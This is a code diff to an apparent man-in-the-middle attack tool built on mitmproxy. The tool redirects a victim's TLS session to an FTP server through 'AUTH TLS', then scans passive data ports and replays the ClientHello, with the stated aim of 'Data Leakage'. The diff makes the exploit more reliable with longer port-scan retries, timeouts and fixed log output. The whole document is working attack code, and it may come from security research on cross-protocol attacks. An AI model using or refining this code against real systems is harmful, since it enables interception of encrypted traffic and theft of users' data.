@@ -34,10 +34,10 @@ class FTPHandler:
 
     def _forward_http_traffic(self, addr, client_socket):
         _info("mitmproxy.atck", f"[{addr.ip}] [RUN] FORWARD HTTP TRAFFIC")
-        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] CONNECT TO {self.unarmed_target_ip}{self.unarmed_target_port}")
+        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] CONNECT TO {self.unarmed_target_ip}:{self.unarmed_target_port}")
         target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         target_socket.connect((self.unarmed_target_ip, self.unarmed_target_port))
-        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] CONNECTED TO {self.unarmed_target_ip}{self.unarmed_target_port}")
+        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] CONNECTED TO {self.unarmed_target_ip}:{self.unarmed_target_port}")
         forward_tls_handshake_and_data(addr, client_socket, target_socket)
 
     def _prepare_attack(self, addr, client_socket):
@@ -46,7 +46,7 @@ class FTPHandler:
         target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         target_socket.connect((self.target_ip, self.target_port))
         target_socket.recv(4096)
-        target_socket.sendall(b"AUTH SSL\n")
+        target_socket.sendall(b"AUTH TLS\r\n")  # AUTH SSL is also acceptable
         target_socket.recv(4096)
 
         forward_tls_handshake_and_data(addr, client_socket, target_socket)
@@ -56,32 +56,38 @@ class FTPHandler:
 
     def _leak_data(self, addr, client_socket):
         _info("mitmproxy.leak", f"[{addr.ip}] [RUN] Data Leakage")
-        while self.status[addr.ip] is not ATTACK_PREPARED:
+        while self.status[addr.ip] != ATTACK_PREPARED:
             time.sleep(1)
 
+        # Consume the ClientHello (do not use MSG_PEEK)
         client_hello = read_tls_packet(client_socket)
-
-        for pasv_port in range(10090, 10101):
-            try:
-                _info("mitmproxy.leak", f"[{addr.ip}] Try to port {self.target_ip}:{pasv_port}")
-                target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                target_socket.connect((self.target_ip, pasv_port))
-
-                target_socket.sendall(client_hello)
-
+        time.sleep(5.0)
+        # Retry scanning the PASV range for longer to allow the server to open a data port
+        # Scan longer to catch the data port after RETR triggers server readiness
+        deadline = time.time() + 60.0
+        while time.time() < deadline:
+            for pasv_port in range(10100, 10101):
                 try:
-                    server_hello = read_tls_packet(target_socket)
-                except:
-                    raise ConnectionRefusedError
-
-                client_socket.sendall(server_hello)
-                forward_tls_handshake_and_data(addr, client_socket, target_socket)
-
-                client_socket.close()
-                target_socket.close()
-                self.status[addr.ip] = ATTACK_FINISHED
-                _info("mitmproxy.leak", f"[{addr.ip}] [FIN] Data Leakage")
-                return
-            except ConnectionRefusedError:
-                _info("mitmproxy.leak", f"[{addr.ip}] ConnectionRefusedError")
-        _error("mitmproxy.leak", "Cound not find open passive port")
+                    _info("mitmproxy.leak", f"[{addr.ip}] Trying data port {self.target_ip}:{pasv_port}")
+                    target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    target_socket.settimeout(2.0)
+                    target_socket.connect((self.target_ip, pasv_port))
+                    if client_hello:
+                        target_socket.sendall(client_hello)
+                    try:
+                        server_hello = read_tls_packet(target_socket)
+                    except Exception:
+                        raise ConnectionRefusedError
+                    client_socket.sendall(server_hello)
+                    forward_tls_handshake_and_data(addr, client_socket, target_socket)
+                    client_socket.close()
+                    target_socket.close()
+                    self.status[addr.ip] = ATTACK_FINISHED
+                    _info("mitmproxy.leak", f"[{addr.ip}] [FIN] Data Leakage")
+                    return
+                except ConnectionRefusedError:
+                    _info("mitmproxy.leak", f"[{addr.ip}] ConnectionRefusedError")
+                except Exception as e:
+                    _info("mitmproxy.leak", f"[{addr.ip}] Error: {e}")
+            time.sleep(0.75)
+        _error("mitmproxy.leak", "Could not find open passive port")
